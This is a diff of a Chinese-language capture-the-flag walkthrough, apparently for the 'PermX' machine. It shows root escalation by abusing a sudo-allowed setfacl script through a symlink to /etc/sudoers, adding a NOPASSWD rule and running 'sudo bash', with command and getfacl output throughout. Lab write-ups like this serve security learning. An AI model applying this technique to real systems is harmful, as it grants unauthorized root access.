@@ -175,7 +175,7 @@ user="$1"
 perm="$2"
 target="$3"
 
-if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then //软连接指向一定路径/home/mtz/文件
     /usr/bin/echo "Access denied."
     exit 1
 fi
@@ -188,50 +188,73 @@ fi
 
 /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
 ```
-#### 看到脚本首先检查传递的参数数是否等于3；如果没有，显示使用情况消息并退出。如果传递了所有三个参数，脚本将检查是否目标文件位于/home/mtz/目录中，其路径中不包含任何“..”有助于防止目录遍历。如果目标文件未通过此检查，则拒绝访问。最后,脚本使用setfacl修改文件的访问控制列表ACL，允许指定的用户访问对目标文件具有已定义的权限。该命令以提升的权限执行由于sudo的使用。
-
-#### 总之，该脚本修改指定文件的访问控制列表ACL/home/mtz/目录，允许指定的用户具有特定的权限（例如读取或读取）在那个文件上写。我们可以利用这一点，通过首先使用创建一个符号链接来获得一个root shell下面的命令使用ln和-s标志。这将创建一个名为root in的符号链接指向/etc/sudoers文件的MTZ主目录。
-```
-mtz@permx:~$ ln -s /etc/sudoers 
-```
-#### 然后，我们继续使用acl.sh脚本为链接的文件授予读写权限。通过使用下面的命令执行脚本，我们指定了用户mtz、权限rw、目标文件，就是我们刚刚创建的符号链接。
-```
-mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
-Target must be a file.
-```
-#### 接下来，我们通过符号链接向/etc/sudoers文件添加一行，以允许mtz用户执行以下操作使用以下命令以root身份执行任意命令，无需密码。
-```
-mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD:ALL" >> /home/mtz/sudoers
-```
-#### 最后，我们可以运行sudo bash以root身份获得一个shell，这将为我们提供升级的shell特权，允许我们以root用户的身份执行任何命令。
 
 ### 正解
 ```
 mtz@permx:~$ ls
 user.txt
-mtz@permx:~$ ln -s /etc/sudoers
+mtz@permx:~$ ln -s /etc/sudoers  //软连接
 mtz@permx:~$ ls 
 sudoers  user.txt
-mtz@permx:~$ cat sudoers
-cat: sudoers: Permission denied
 mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
 mtz@permx:~$ ls
 sudoers  user.txt
-mtz@permx:~$ cat sudoers
-<SNIP>
-mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
 
-mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
 mtz@permx:~$ getfacl /home/mtz/sudoers
 getfacl: Removing leading '/' from absolute path names
 # file: home/mtz/sudoers
-# owner: mtz
-# group: mtz
-user::rw-
+# owner: root
+# group: root
+user::r--
 user:mtz:rwx
-group::rw-
+group::r--
 mask::rwx
-other::r--
+other::---
 
+mtz@permx:~$ getfacl /etc/sudoers
+getfacl: Removing leading '/' from absolute path names
+# file: etc/sudoers
+# owner: root
+# group: root
+user::r--
+user:mtz:rwx
+group::r--
+mask::rwx
+other::---
 
+mtz@permx:~$ getfacl sudoers
+# file: sudoers
+# owner: root
+# group: root
+user::r--
+user:mtz:rwx
+group::r--
+other::---
+```
 
+```
+mtz@permx:~$ vi /etc/sudoers
+<SNIP>
+mtz ALL=(ALL:ALL) NOPASSWD: /bin/bash  //在最后添加
+mtz@permx:~$ sudo bash
+root@permx:/home/mtz#
+root@permx:~# cat root.txt
+```
+### 总结root提权,执行sudo命令之后，速度要快，软连接会消失
+```
+mtz@permx:~$ ln -s /etc/sudoers
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
+mtz@permx:~$ getfacl sudoers
+# file: sudoers
+# owner: root
+# group: root
+user::r--
+user:mtz:rwx  //有了这个权限之后可以vi 
+group::r--
+other::---
+mtz@permx:~$ vi /etc/sudoers
+![原来距离昨天的昨天才2天](image/091203.png)
+mtz ALL=(ALL:ALL) NOPASSWD: /bin/bash
+退出vi的按键：esc,Shitf+:,wq,回车
+mtz@permx:~$ sudo bash
+```
